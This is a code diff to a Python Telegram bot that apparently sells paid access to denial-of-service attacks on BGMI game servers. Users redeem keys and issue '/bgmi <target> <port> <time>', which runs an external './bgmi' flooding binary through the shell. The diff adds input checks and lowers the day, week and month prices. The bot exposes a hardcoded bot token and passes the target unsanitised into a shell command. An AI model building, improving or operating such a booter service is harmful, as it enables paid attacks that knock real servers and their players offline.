@@ -1,5 +1,3 @@
-#ZAHER
-
 import telebot
 import subprocess
 import datetime
@@ -7,7 +5,6 @@ import os
 import random
 import string
 import json
-
 
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('7248601249:AAHCcvqi4fAkddlGJMnJBpiEpYn70FH0Iec')
@@ -25,7 +22,7 @@ LOG_FILE = "log.txt"
 KEY_FILE = "keys.json"
 
 # Cooldown time for users
-COOLDOWN_TIME = 300  #  1minutes 
+COOLDOWN_TIME = 300  # 5 minute
 
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
@@ -130,7 +127,7 @@ def redeem_key_command(message):
             save_users(users)
             del keys[key]
             save_keys(keys)
-            response = f"✅Key redeemed successfully! Access granted until: {expiration_date}"
+            response = f"Key redeemed successfully! Access granted until: {expiration_date}"
         else:
             response = "Invalid or expired key."
     else:
@@ -147,7 +144,7 @@ def handle_bgmi(message):
         if datetime.datetime.now() <= expiration_date:
             if user_id not in admin_id:
                 if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                    response = "You are on cooldown. Please wait 5 minutes before running the /bgmi command again."
+                    response = f"You are on cooldown. Please wait {COOLDOWN_TIME // 300} minute(s) before running the /bgmi command again."
                     bot.reply_to(message, response)
                     return
                 bgmi_cooldown[user_id] = datetime.datetime.now()
@@ -155,19 +152,22 @@ def handle_bgmi(message):
             command = message.text.split()
             if len(command) == 4:
                 target = command[1]
-                port = int(command[2])
-                time = int(command[3])
-                if time > 180:
-                    response = "Error: Time interval must be less than 180 seconds."
-                else:
-                    record_command_logs(user_id, '/bgmi', target, port, time)
-                    log_command(user_id, target, port, time)
-                    start_attack_reply(message, target, port, time)
-                    full_command = f"./bgmi {target} {port} {time} 305"
-                    subprocess.run(full_command, shell=True)
-                    response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                try:
+                    port = int(command[2])
+                    time = int(command[3])
+                    if time > 180:
+                        response = "Error: Time interval must be less than 180 seconds."
+                    else:
+                        record_command_logs(user_id, '/bgmi', target, port, time)
+                        log_command(user_id, target, port, time)
+                        start_attack_reply(message, target, port, time)
+                        full_command = f"./bgmi {target} {port} {time} 350"
+                        subprocess.run(full_command, shell=True)
+                        response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                except ValueError:
+                    response = "Error: Port and time must be integers."
             else:
-                response = "✅Usage: /bgmi <target> <port> <time>"
+                response = "Usage: /bgmi <target> <port> <time>"
         else:
             response = "Your access has expired. Please redeem a new key."
     else:
@@ -232,7 +232,7 @@ def show_recent_logs(message):
 def show_user_id(message):
     user_id = str(message.chat.id)
     response = f"🤖Your ID: {user_id}"
-    bot.reply_to(message, response)
+    bot.reply_to(message,    response)
 
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
@@ -251,7 +251,8 @@ def show_command_logs(message):
     else:
         response = "You are not authorized to use this command."
 
-    bot.reply_to(message), response
+    bot.reply_to(message, response)
+
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''🤖 Available commands:
@@ -300,9 +301,9 @@ VIP 🌟:
 -> Concurrent attacks: 3
 
 Price list 💸:
-Day: 200 Rs
-Week: 700 Rs
-Month: 1800 Rs
+Day: 100 Rs
+Week: 400 Rs
+Month: 800 Rs
 '''
     bot.reply_to(message, response)
 
@@ -345,4 +346,4 @@ while True:
         bot.polling(none_stop=True)
     except Exception as e:
         print(e)
-#zaher
+
